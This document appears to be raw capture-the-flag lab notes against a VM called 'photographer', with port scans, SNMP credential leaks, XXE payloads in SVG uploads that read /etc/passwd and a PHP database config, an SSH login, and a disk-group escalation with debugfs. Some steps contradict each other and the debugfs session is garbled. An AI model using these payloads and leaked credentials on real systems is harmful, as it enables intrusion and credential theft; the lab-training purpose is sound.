──(kali㉿kali)-[~/Documents/photographer]
└─$ nmap -sS -p- --open --min-rate 5000 -Pn -n 192.168.56.11 -oN scan.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-30 09:30 EDT
Nmap scan report for 192.168.56.11
Host is up (0.000098s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:1A:F2:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 2.73 seconds



====================================================================================================================================================================================

kali㉿kali)-[~/Documents/photographer]
└─$ nmap -sVC -p22,80 -vvv -n -Pn 192.168.56.11 -oN fullscan.txt   


PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u7 (protocol 2.0)
| ssh-hostkey: 
|   256 af:79:a1:39:80:45:fb:b7:cb:86:fd:8b:62:69:4a:64 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBA9i7hiBgZdbqok5ESuJPFfkPuRpcCT6UEeh71LyPq3i2pfdC6S1w4UYO17jknxy06B1COEcaGELE4n2KCor3M4=
|   256 6d:d4:9d:ac:0b:f0:a1:88:66:b4:ff:f6:42:bb:f2:e5 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOaMroBaMRuicicDHyP1mRMULBpy4OqNENpp/l/O/cIq
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.65 ((Debian))
|_http-title: Ethan | Blog
|_http-server-header: Apache/2.4.65 (Debian)
| http-methods: 
|_  Supported Methods: POST OPTIONS HEAD GET
MAC Address: 08:00:27:1A:F2:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 09:31
Completed NSE at 09:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 09:31
Completed NSE at 09:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 09:31
Completed NSE at 09:31, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.34 seconds
           Raw packets sent: 3 (116B) | Rcvd: 3 (116B)
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/photographer]





====================================================================================================================================================================================





┌──(kali㉿kali)-[~/Documents/photographer]
└─$ gobuster dir -u http://192.168.56.11/ -x php,html,css,js,txt,pdf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.11/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              css,js,txt,pdf,php,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/images               (Status: 301) [Size: 315] [--> http://192.168.56.11/images/]
/index.html           (Status: 200) [Size: 6244]
/about.html           (Status: 200) [Size: 2750]
/.html                (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://192.168.56.11/admin/]
/assets               (Status: 301) [Size: 315] [--> http://192.168.56.11/assets/]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 1543920 / 1543927 (100.00%)
===============================================================
Finished


====================================================================================================================================================================================




──(kali㉿kali)-[~/Documents/photographer]
└─$ gobuster dir -u http://192.168.56.11/admin/ -x php,html,css,js,txt,pdf -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.56.11/admin/
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              pdf,php,html,css,js,txt
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
/index.php            (Status: 200) [Size: 943]
/img                  (Status: 301) [Size: 318] [--> http://192.168.56.11/admin/img/]
/admin.php            (Status: 302) [Size: 1076] [--> index.php]
/upload.php           (Status: 500) [Size: 0]
/db.php               (Status: 200) [Size: 0]
/logout.php           (Status: 302) [Size: 0] [--> index.php]
/styles.css           (Status: 200) [Size: 1788]
/.php                 (Status: 403) [Size: 278]
/.html                (Status: 403) [Size: 278]
Progress: 1179590 / 1543927 (76.40%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 1180618 / 1543927 (76.47%)
===============================================================
Finished

====================================================================================================================================================================================
┌──(kali㉿kali)-[~/Documents/photographer]
└─$ nmap -sU -p- --open --min-rate 5000 -Pn -n 192.168.56.11 -oN scanUDP.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-11-06 14:42 EST
Warning: 192.168.56.11 giving up on port because retransmission cap hit (10).
Nmap scan report for 192.168.56.11
Host is up (0.00037s latency).
Not shown: 65384 open|filtered udp ports (no-response), 150 closed udp ports (port-unreach)
PORT    STATE SERVICE
161/udp open  snmp
MAC Address: 08:00:27:1A:F2:64 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 145.04 seconds
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/photographer]
└─$ 



─$ snmpwalk -v2c -c public 192.168.56.11    
iso.3.6.1.2.1.1.1.0 = STRING: "Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64"
iso.3.6.1.2.1.1.2.0 = OID: iso.3.6.1.4.1.8072.3.2.10
iso.3.6.1.2.1.1.3.0 = Timeticks: (2274306) 6:19:03.06
iso.3.6.1.2.1.1.4.0 = STRING: "Me <me@example.org>"
iso.3.6.1.2.1.1.5.0 = STRING: "photographer"
iso.3.6.1.2.1.1.6.0 = STRING: "Sitting on the Dock of the Bay"
iso.3.6.1.2.1.1.7.0 = INTEGER: 72
iso.3.6.1.2.1.1.8.0 = Timeticks: (28) 0:00:00.28
iso.3.6.1.2.1.1.9.1.2.1 = OID: iso.3.6.1.6.3.10.3.1.1
iso.3.6.1.2.1.1.9.1.2.2 = OID: iso.3.6.1.6.3.11.3.1.1
iso.3.6.1.2.1.1.9.1.2.3 = OID: iso.3.6.1.6.3.15.2.1.1
iso.3.6.1.2.1.1.9.1.2.4 = OID: iso.3.6.1.6.3.1
iso.3.6.1.2.1.1.9.1.2.5 = OID: iso.3.6.1.6.3.16.2.2.1
iso.3.6.1.2.1.1.9.1.2.6 = OID: iso.3.6.1.2.1.49
iso.3.6.1.2.1.1.9.1.2.7 = OID: iso.3.6.1.2.1.50
iso.3.6.1.2.1.1.9.1.2.8 = OID: iso.3.6.1.2.1.4
iso.3.6.1.2.1.1.9.1.2.9 = OID: iso.3.6.1.6.3.13.3.1.3
iso.3.6.1.2.1.1.9.1.2.10 = OID: iso.3.6.1.2.1.92
iso.3.6.1.2.1.1.9.1.3.1 = STRING: "The SNMP Management Architecture MIB."
iso.3.6.1.2.1.1.9.1.3.2 = STRING: "The MIB for Message Processing and Dispatching."
iso.3.6.1.2.1.1.9.1.3.3 = STRING: "The management information definitions for the SNMP User-based Security Model."
iso.3.6.1.2.1.1.9.1.3.4 = STRING: "The MIB module for SNMPv2 entities"
iso.3.6.1.2.1.1.9.1.3.5 = STRING: "View-based Access Control Model for SNMP."
iso.3.6.1.2.1.1.9.1.3.6 = STRING: "The MIB module for managing TCP implementations"
iso.3.6.1.2.1.1.9.1.3.7 = STRING: "The MIB module for managing UDP implementations"
iso.3.6.1.2.1.1.9.1.3.8 = STRING: "The MIB module for managing IP and ICMP implementations"
iso.3.6.1.2.1.1.9.1.3.9 = STRING: "The MIB modules for managing SNMP Notification, plus filtering."
iso.3.6.1.2.1.1.9.1.3.10 = STRING: "The MIB module for logging SNMP Notifications."
iso.3.6.1.2.1.1.9.1.4.1 = Timeticks: (20) 0:00:00.20
iso.3.6.1.2.1.1.9.1.4.2 = Timeticks: (20) 0:00:00.20
iso.3.6.1.2.1.1.9.1.4.3 = Timeticks: (20) 0:00:00.20
iso.3.6.1.2.1.1.9.1.4.4 = Timeticks: (20) 0:00:00.20
iso.3.6.1.2.1.1.9.1.4.5 = Timeticks: (20) 0:00:00.20
iso.3.6.1.2.1.1.9.1.4.6 = Timeticks: (20) 0:00:00.20
iso.3.6.1.2.1.1.9.1.4.7 = Timeticks: (20) 0:00:00.20
iso.3.6.1.2.1.1.9.1.4.8 = Timeticks: (21) 0:00:00.21
iso.3.6.1.2.1.1.9.1.4.9 = Timeticks: (21) 0:00:00.21
iso.3.6.1.2.1.1.9.1.4.10 = Timeticks: (28) 0:00:00.28
iso.3.6.1.2.1.25.1.1.0 = Timeticks: (2275150) 6:19:11.50
iso.3.6.1.2.1.25.1.2.0 = Hex-STRING: 07 E9 0B 06 14 2F 2F 00 2B 01 00 
iso.3.6.1.2.1.25.1.3.0 = INTEGER: 393216
iso.3.6.1.2.1.25.1.4.0 = STRING: "BOOT_IMAGE=/boot/vmlinuz-6.1.0-40-amd64 root=UUID=77e51563-68a2-4cef-9d02-2b434abfe0dd ro quiet
"
iso.3.6.1.2.1.25.1.5.0 = Gauge32: 0
iso.3.6.1.2.1.25.1.6.0 = Gauge32: 72
iso.3.6.1.2.1.25.1.7.0 = INTEGER: 0
iso.3.6.1.2.1.25.1.7.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/photographer]








====================================================================================================================================================================================

┌──(kali㉿kali)-[~/Documents/photographer]
└─$ snmpwalk -v2c -c security 192.168.56.134 . | grep ethan
Timeout: No Response from 192.168.56.134
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/photographer]
└─$ snmpwalk -v2c -c security 192.168.56.11 . | grep ethan
iso.3.6.1.4.1.8072.1.3.2.2.1.3.7.109.121.99.114.101.100.115 = STRING: "/home/ethan/creds.txt"
iso.3.6.1.4.1.8072.1.3.2.3.1.1.7.109.121.99.114.101.100.115 = STRING: "ethan:1N3qVgwNB6cZmNSyr8iX$!"
iso.3.6.1.4.1.8072.1.3.2.3.1.2.7.109.121.99.114.101.100.115 = STRING: "ethan:1N3qVgwNB6cZmNSyr8iX$!"
iso.3.6.1.4.1.8072.1.3.2.4.1.2.7.109.121.99.114.101.100.115.1 = STRING: "ethan:1N3qVgwNB6cZmNSyr8iX$!"
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/photographer]
└─$ 





====================================================================================================================================================================================





POST /admin/upload.php HTTP/1.1
Host: 192.168.56.11
Content-Length: 316
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.56.11
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3WZwJTBajL2HPB6O
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.56.11/admin/admin.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=3bqs54ico5j7isubcf1n98hj64
Connection: keep-alive

------WebKitFormBoundary3WZwJTBajL2HPB6O
Content-Disposition: form-data; name="file"; filename="donuts-cake-svgrepo-com.svg"
Content-Type: image/svg+xml

<?xml version="1.0"  standalone="no"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM 'file:///etc/passwd'>]><svg>&xxe;</svg>
------WebKitFormBoundary3WZwJTBajL2HPB6O--






HTTP/1.1 200 OK
Date: Thu, 06 Nov 2025 20:41:01 GMT
Server: Apache/2.4.65 (Debian)
Vary: Accept-Encoding
Content-Length: 1219
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<svg>root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
debian:x:1000:1000:debian,,,:/home/debian:/bin/bash
Debian-snmp:x:102:110::/var/lib/snmp:/bin/false
ethan:x:1001:1001::/home/ethan:/bin/bash
mysql:x:103:111:MySQL Server,,,:/nonexistent:/bin/false
</svg>


====================================================================================================================================================================================

POST /admin/upload.php HTTP/1.1
Host: 192.168.56.11
Content-Length: 353
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.56.11
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary3WZwJTBajL2HPB6O
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.56.11/admin/admin.php
Accept-Encoding: gzip, deflate, br
Cookie: PHPSESSID=3bqs54ico5j7isubcf1n98hj64
Connection: keep-alive

------WebKitFormBoundary3WZwJTBajL2HPB6O
Content-Disposition: form-data; name="file"; filename="donuts-cake-svgrepo-com.svg"
Content-Type: image/svg+xml

<?xml version="1.0"  standalone="no"?><!DOCTYPE svg [<!ENTITY xxe SYSTEM 'php://filter/read=convert.base64-encode/resource=db.php'>]><svg>&xxe;</svg>
------WebKitFormBoundary3WZwJTBajL2HPB6O--







HTTP/1.1 200 OK
Date: Thu, 06 Nov 2025 20:39:43 GMT
Server: Apache/2.4.65 (Debian)
Vary: Accept-Encoding
Content-Length: 315
Keep-Alive: timeout=5, max=100
Connection: Keep-Alive
Content-Type: text/html; charset=UTF-8

<svg>PD9waHAKJGhvc3QgPSAibG9jYWxob3N0IjsKJGRiID0gImJsb2ciOwokdXNlciA9ICJyb290IjsKJHBhc3MgPSAicGp0RjA1MzNPUGlTTVFUR1phY1pZNmp5JCI7CgokY29ubiA9IG5ldyBteXNxbGkoJGhvc3QsICR1c2VyLCAkcGFzcywgJGRiKTsKaWYgKCRjb25uLT5jb25uZWN0X2Vycm9yKSB7CiAgICBkaWUoIkNvbmV4acOzbiBmYWxsaWRhOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwp9Cg==</svg>




====================================================================================================================================================================================

┌──(kali㉿kali)-[~/Documents/photographer]
└─$ echo "PD9waHAKJGhvc3QgPSAibG9jYWxob3N0IjsKJGRiID0gImJsb2ciOwokdXNlciA9ICJyb290IjsKJHBhc3MgPSAicGp0RjA1MzNPUGlTTVFUR1phY1pZNmp5JCI7CgokY29ubiA9IG5ldyBteXNxbGkoJGhvc3QsICR1c2VyLCAkcGFzcywgJGRiKTsKaWYgKCRjb25uLT5jb25uZWN0X2Vycm9yKSB7CiAgICBkaWUoIkNvbmV4acOzbiBmYWxsaWRhOiAiIC4gJGNvbm4tPmNvbm5lY3RfZXJyb3IpOwp9Cg==" | base64 -d
<?php
$host = "localhost";
$db = "blog";
$user = "root";
$pass = "pjtF0533OPiSMQTGZacZY6jy$";

$conn = new mysqli($host, $user, $pass, $db);
if ($conn->connect_error) {
    die("Conexión fallida: " . $conn->connect_error);
}
                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/photographer]
└─$ 



====================================================================================================================================================================================



                                                                                                                                                            
┌──(kali㉿kali)-[~/Documents/photographer]
└─$ ssh ethan@192.168.56.11 
ethan@192.168.56.11's password: pjtF0533OPiSMQTGZacZY6jy$
Linux photographer 6.1.0-40-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.153-1 (2025-09-20) x86_64
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠶⣞⡩⠽⢷⣆⣀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢀⣀⡤⢿⠀⢹⠖⠒⡛⠧⠐⠉⣧⠀⠀⠀⠀
⠀⢀⡠⠴⣲⣭⡁⠲⠇⢈⡑⢚⠪⠭⠤⠤⢄⣀⣿⠀⠀⠀⠀
⢠⠃⠤⠄⠉⠉⠀⠐⠉⣡⠞⠁⢀⡴⠞⠉⢉⣩⠿⠶⣄⠀
⢸⠀⠀⠀⠀⡄⠀⠀⣰⠃⠀⢠⡞⠀⠀⡴⢋⣴⣿⣿⣷⡘⣆
⢸⠀⠀⠀⠀⡇⠀⠀⡏⠀⠀⣾⠀⠀⡜⢀⣾⣿⣤⣾⣿⡇⣿
⢨⠀⠀⠀⠀⡇⠀⠀⣇⠀⠀⡏⠀⠀⡇⢸⣿⣿⣿⣿⣿⢁⡏
⠈⠀⣀⠀⠀⣷⠀⠀⠘⢄⠀⢳⠀⠀⡇⠸⣿⣿⣹⡿⢃⡼⠁
⢰⡀⠛⠓⠀⢻⠀⠀⠀⠀⢙⣻⡷⠦⣼⣦⣈⣉⣡⡴⠚⠀⠀
⠀⢷⣄⡀⠀⠀⠀⢀⡠⠖⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠉⠛⠓⠒⠚⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀Photographer

Last login: Tue Oct 28 19:47:04 2025 from 192.168.1.17
ethan@photographer:~$ whoami
ethan
ethan@photographer:~$ 



====================================================================================================================================================================================

ethan@photographer:~$ whoami
ethan
ethan@photographer:~$ ls
creds.txt  user.txt
ethan@photographer:~$ cat user.txt 
3fd75fcad59cce5c0bbb0f1a52b04ebd

====================================================================================================================================================================================

Si revisamos los grupos a los que pertenece nuestro usuario con el comando id vemos que estamos en el grupo disk, el cual nos da la posibilidad de leer el contenido de las particiones del disco, eso sí, al no disponer de una herramienta como debugfs únicamente podemos ver el contenido bruto.

Por lo tanto, vamos a realizar la escalada con un método bastante "bruto" y poco óptimo pero funciona.

Míramos en que partición está montado el contenido del sistema con df -h.

ethan@photographer:~$ id
uid=1001(ethan) gid=1001(ethan) grupos=1001(ethan),6(disk)
ethan@photographer:~$ 


====================================================================================================================================================================================
ethan@photographer:~$ /sbin/debugfs /dev/sda1
debugfs 1.47.0 (5-Feb-2023)
debugfs:  ls
 

debugfs (list_directory): Unknown request "a".  Type "?" for a request list.
debugfs:  
debugfs (list_directory): Unknown request "cats".  Type "?" for a request list.
debugfs:  
debugfs (list_directory): Unknown request ":q".  Type "?" for a request list.
debugfs:  
debugfs:  
/rott: File not found by ext2_lookup 
debugfs:  
debugfs: Unknown request "ca".  Type "?" for a request list.
debugfs:  
dc54639c5bd88637cc23dd7dd1827bbf
debugfs:  
